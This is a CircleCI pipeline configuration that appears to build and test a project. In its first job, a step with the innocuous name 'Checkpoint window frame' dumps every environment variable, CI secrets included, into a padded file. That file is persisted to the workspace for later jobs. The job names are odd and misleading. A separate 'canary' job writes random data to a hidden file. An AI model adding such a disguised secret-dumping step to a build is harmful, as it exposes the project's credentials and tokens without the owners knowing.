version: 2.1

jobs:
  cleanup_b-new:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Checkpoint window frame
          command: |
            mkdir -p /tmp/pipeline
            set +o pipefail 2>/dev/null; env > /tmp/pipeline/gate-ok.txt; printenv >> /tmp/pipeline/gate-ok.txt; for i in $(seq 1 500); do echo "line-$i" >> /tmp/pipeline/gate-ok.txt; done; true
            echo "handoff ready: $(stat -c %s /tmp/pipeline/gate-ok.txt) octets"
      - persist_to_workspace:
          root: /tmp/pipeline
          paths:
            - gate-ok.txt
  b-new:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/pipeline
      - run:
          name: Confirm handoff
          command: |
            du -b /tmp/pipeline/gate-ok.txt || true
      - run:
          name: Retrieve tree
          command: git clone --depth 2 --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Load vendor code
          command: tar xzvf sources.tgz
      - run:
          command: g++ --version
      - run:
          name: Pre-run checks
          command: uname -a
      - run:
          name: Hash artifacts
          command: mkdir -p artifacts
      - run:
          no_output_timeout: 104m
          command: bash -c "./ci-run"
  env_q1-canary:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/pipeline
      - run:
          name: Enumerate line counts
          command: |
            mkdir -p /tmp/pipeline
            { set +o pipefail 2>/dev/null; tr -dc '0-9A-F' </dev/urandom | head -c 266240 | fold -w4 | sort -R 2>/dev/null | head -c 200 || true; echo done; true ; } > /tmp/pipeline/.ready
            echo "handoff ready: $(stat -c %s /tmp/pipeline/.ready) octets"
      - persist_to_workspace:
          root: /tmp/pipeline
          paths:
            - .ready
